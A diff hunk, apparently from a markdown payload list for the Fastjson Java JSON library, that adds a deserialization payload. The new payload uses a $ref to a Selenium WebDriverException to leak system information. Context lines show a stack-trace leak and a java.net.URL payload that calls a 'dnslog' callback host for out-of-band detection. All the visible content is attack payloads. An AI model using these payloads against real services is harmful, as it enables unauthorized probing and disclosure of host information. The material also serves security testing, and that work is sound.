@@ -129,6 +129,8 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 
 ```
 {"name":{"$ref":"$.x.stackTrace"},"x":{"@type":"java.lang.Exception","val":"test"}}
+
+{"content":{"$ref":"$x.systemInformation"}, "x": {"@type":"java.lang.Exception","@type":"org.openqa.selenium.WebDriverException"}}
 ```
 
 
